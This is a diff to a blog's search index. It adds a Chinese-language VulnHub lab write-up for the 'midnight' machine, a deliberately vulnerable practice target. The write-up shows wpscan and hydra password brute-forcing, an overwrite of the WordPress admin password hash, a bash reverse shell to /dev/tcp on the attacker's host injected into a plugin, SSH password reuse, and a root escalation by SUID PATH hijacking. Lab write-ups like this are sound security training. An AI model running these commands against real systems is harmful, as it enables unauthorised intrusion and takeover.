@@ -1,6 +1,65 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>VulnHub靶机writeup--midnight</title>
+    <url>/2020/09/10/VulnHub%E9%9D%B6%E6%9C%BAwriteup-midnight/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>再来一个靶机，做完这个最近换点东西写，感觉这些靶机做多了也是套路，之后做的整点难度高点的，比如这个靶机难度比之前高点，学的东西也多一点。</p>
+<a id="more"></a>
+
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>上来老传统，收集一波信息</p>
+<blockquote>
+<p>kali：192.168.1.185</p>
+<p>靶机：192.168.1.242</p>
+<p>靶机开放22，80，3306端口</p>
+</blockquote>
+<p>打开web页面，url变为<code>http://sunset-midnight/</code>，路径<code>/etc/hosts</code>修改下host信息，再次打开web页面，发现是<code>wordpress</code>搭建的，用<code>wpscan</code>扫一下</p>
+<p><code>wpscan --url http://sunset-midnight/ -e</code></p>
+<p>没有值得关注的部分，发现一个用户名<code>admin</code>，<code>wpscan</code>尝试爆破一下</p>
+<p><code>wpscan --url http://sunset-midnight/ -U admin -P /usr/share/wordlists/rockyou.txt</code></p>
+<p>在爆破的同时查看下其他突破点，靶机开放3306mysql端口，用<code>hydra</code>爆破下<code>root</code>用户密码</p>
+<p><code>hydra 192.168.1.242 mysql -l root -P /usr/share/wordlists/rockyou.txt</code></p>
+<p><img src="https://s1.ax1x.com/2020/09/10/wYwJqs.png" alt="wYwJqs.png"></p>
+<p>爆破出来密码为<code>robert</code> ，连接一波</p>
+<p><code>mysql -u root -p -h sunset-midnight</code></p>
+<p><img src="https://s1.ax1x.com/2020/09/10/wYwWi6.png" alt="wYwWi6.png"></p>
+<p>在<code>wordpress_db</code>数据库中的<code>wp_users</code>表中看到admin用户密码</p>
+<p><img src="https://s1.ax1x.com/2020/09/10/wY0AYV.png" alt="wY0AYV.png"></p>
+<p>这里密码难以破解，可以update更新一个新的密码MD5覆盖掉原来密码</p>
+<p><img src="https://s1.ax1x.com/2020/09/10/wY0IhV.png" alt="wY0IhV.png"></p>
+<p>这个时候就可以登陆wordpress了，可以通过Plugins中的Plugin Editor中编辑插件，加入一个反弹shell，这里选择Hello Dolly，在代码前加入<code>system(&quot;/bin/bash -c &#39;bash -i &amp;&gt; /dev/tcp/192.168.1.185/9527 0&gt;&amp;1&#39;&quot;);</code></p>
+<p><img src="https://s1.ax1x.com/2020/09/10/wYDQG6.png" alt="wYDQG6.png"></p>
+<p>选择Update File，在本地设置好监听，然后在Installed Plugins中将Hello Dolly点击Activate</p>
+<p><img src="https://s1.ax1x.com/2020/09/10/wYr8f0.png" alt="wYr8f0.png"></p>
+<p>成功反弹出一个www-data的shell，在shell中寻找有用信息时，在网站根目录下的wordpress目录看到wp-config.php，在其中看到一个账户密码</p>
+<p><img src="https://s1.ax1x.com/2020/09/10/wYy2od.png" alt="wYy2od.png"></p>
+<p>正好在/home/路径下也看到靶机上有个jose用户，尝试是否用密码复用，ssh连接一下</p>
+<p><img src="https://s1.ax1x.com/2020/09/10/wYyXYn.png" alt="wYyXYn.png"></p>
+<p>成功连上，获取到了jose权限</p>
+<p>这个时候，靶机已经做到最后一步——提权到root用户，这个靶机用到了SUID提权的方式，这个之前没有学习过，趁此机会<a href="http://notes.getshell.net/Notes/131.html" target="_blank" rel="noopener">学习</a>了一波</p>
+<p><img src="https://s1.ax1x.com/2020/09/11/wYcKg0.png" alt="wYcKg0.png"></p>
+<p>找一下具有SUID权限的文件，这个看到这个<code>/usr/bin/status</code>这个文件有点问题，拉下来反汇编看下</p>
+<p><img src="https://s1.ax1x.com/2020/09/11/wYOCng.png" alt="wYOCng.png"></p>
+<p>了解到了<code>/usr/bin/status</code>这个文件的内容，接下来利用其获取到root权限</p>
+<p>首先在<code>/tmp</code>目录下创建一个service文件，写入bash</p>
+<p><code>echo &quot;/bin/bash&quot; &gt; /tmp/service</code></p>
+<p>然后给与service文件执行权限</p>
+<p><code>chmod u+x /tmp/service</code></p>
+<p>设置环境变量加入<code>/tmp/</code>目录</p>
+<p><code>export PATH=/tmp:$PATH</code></p>
+<p>然后执行<code>/bin/status</code></p>
+<p><img src="https://s1.ax1x.com/2020/09/11/wYgkxx.png" alt="wYgkxx.png"></p>
+<p>成功获取到了root权限，取得flag</p>
+<p><img src="https://s1.ax1x.com/2020/09/11/wYgmZD.png" alt="wYgmZD.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个靶机整体难度比之前高一点，练习这个靶机也学习到了很多，在web没有突破口的时候，尝试爆破3306端口，取得了root权限的数据库，同时覆盖掉wordpress的用户密码，进入了web端的后台管理界面，因为是admin用户，就可以对插件代码进行修改，加入了反弹shell，本地就获取到靶机的低权限shell，对网站配置文件的查看获取到一个靶机用户shell，然后用SUID提权到root。靶机整体思路比较明晰，也验证了安全是整体的，只要有一个点不安全就能突破防线。</p>
+]]></content>
+      <categories>
+        <category>VulnHub</category>
+      </categories>
+      <tags>
+        <tag>渗透实战</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VulnHub靶机writeup--FunBox</title>
     <url>/2020/09/07/VulnHub%E9%9D%B6%E6%9C%BAwriteup-FunBox/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于开学了，但是开学后也没有期待的那么有意思，不过大四课变少了，现在得习惯在学校和在家的学习状态方式的区别，今天下午做个之前在家下载的靶机。</p>
